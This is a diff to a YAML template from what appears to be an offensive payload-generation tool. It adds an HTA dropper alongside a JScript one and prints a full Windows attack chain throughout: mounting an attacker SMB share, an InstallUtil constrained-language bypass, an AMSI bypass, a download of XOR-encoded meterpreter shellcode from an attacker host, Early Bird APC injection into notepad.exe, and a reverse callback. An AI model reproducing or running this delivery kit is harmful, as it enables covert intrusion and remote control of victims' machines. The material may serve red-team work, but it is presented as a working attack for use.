@@ -25,6 +25,7 @@ content: |
   find /opt -name "System.Management.Automation.dll" 2>/dev/null | head -1 | xargs -I{} mcs /tmp/RuntimeBroker.cs -r:{} -r:System.Configuration.Install -target:exe -sdk:4 -out:packstation/outbound/RuntimeBroker.exe 2>/dev/null && \
   rm /tmp/RuntimeBroker.cs && \
   python -c "import base64; open('packstation/outbound/delivery.js','w').write(base64.b64decode('{{ include('payloads/installutil-jscript-smb.yaml') | base64 }}').decode())" && \
+  python -c "import base64; open('packstation/outbound/delivery.hta','w').write(base64.b64decode('{{ include('payloads/installutil-hta-smb.yaml') | base64 }}').decode())" && \
   printf '%s\n' '================================================================' && \
   printf '%s\n' '                      ------Listener------                      ' && \
   printf '%s\n' 'Start listener: {{ include('scripts/listener-metasploit-windows-x64-meterpreter-staged-tcp.yaml') }}' && \
@@ -40,9 +41,12 @@ content: |
   printf '%s\n' 'Step 3 - Start the meterpreter listener (see above)' && \
   printf '%s\n' 'Step 4 - Start impacket SMB server in a separate terminal:' && \
   printf '%s\n' '  impacket-smbserver share packstation/outbound -smb2support' && \
-  printf '%s\n' 'Step 5 - Deliver delivery.js to the target (e.g., email, USB, webdav)' && \
-  printf '%s\n' 'Step 6 - Attack chain on victim double-click:' && \
-  printf '%s\n' '  delivery.js -> WScript.Shell -> net use \\\\{{ attacker_ip }}\\share (mount SMB)' && \
+  printf '%s\n' 'Step 5 - Pick a delivery variant:' && \
+  printf '%s\n' '  delivery.js  -> JScript via wscript.exe (double-click or wscript delivery.js)' && \
+  printf '%s\n' '  delivery.hta -> HTA via mshta.exe (double-click, or mshta http://{{ attacker_ip }}:{{ delivery_outbound_port }}/delivery.hta)' && \
+  printf '%s\n' 'Step 6 - Deliver chosen file to the target (e.g., email, USB, webdav)' && \
+  printf '%s\n' 'Step 7 - Attack chain on victim execution:' && \
+  printf '%s\n' '  delivery.js/.hta -> WScript.Shell -> net use \\\\{{ attacker_ip }}\\share (mount SMB)' && \
   printf '%s\n' '  -> InstallUtil.exe /U \\\\{{ attacker_ip }}\\share\\RuntimeBroker.exe' && \
   printf '%s\n' '  -> Loader.Uninstall() triggers PS runspace' && \
   printf '%s\n' '  -> PS runspace 1: IEX offer.txt (chosen AMSI bypass)' && \
@@ -50,6 +54,7 @@ content: |
   printf '%s\n' '  -> invoice.txt downloads XOR(0xCA) shellcode from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png' && \
   printf '%s\n' '  -> injects into notepad.exe via Early Bird APC' && \
   printf '%s\n' '  -> meterpreter callback on {{ attacker_ip }}:{{ shell_port }}' && \
+  printf '%s\n' '  -> HTA: window.close() self-terminates mshta.exe, net use /delete cleans SMB' && \
   printf '%s\n' '================================================================' && \
   printf '%s\n' '                  ---Files in packstation---                   ' && \
   printf '%s\n' '  RuntimeBroker.exe         -> installutil CLM bypass (served via SMB)' && \
@@ -57,6 +62,7 @@ content: |
   printf '%s\n' '  offer.txt                 -> chosen AMSI bypass (IEX by C# runspace)' && \
   printf '%s\n' '  invoice.txt               -> APC shellcode runner (IEX by C# runspace)' && \
   printf '%s\n' '  favicon.png               -> XOR(0xCA) meterpreter shellcode (fetched by runner)' && \
-  printf '%s\n' '  delivery.js               -> JScript dropper, deliver to target' && \
+  printf '%s\n' '  delivery.js               -> JScript dropper (deliver to target)' && \
+  printf '%s\n' '  delivery.hta              -> HTA dropper (deliver to target or serve via HTTP)' && \
   printf '%s\n' '================================================================' && \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
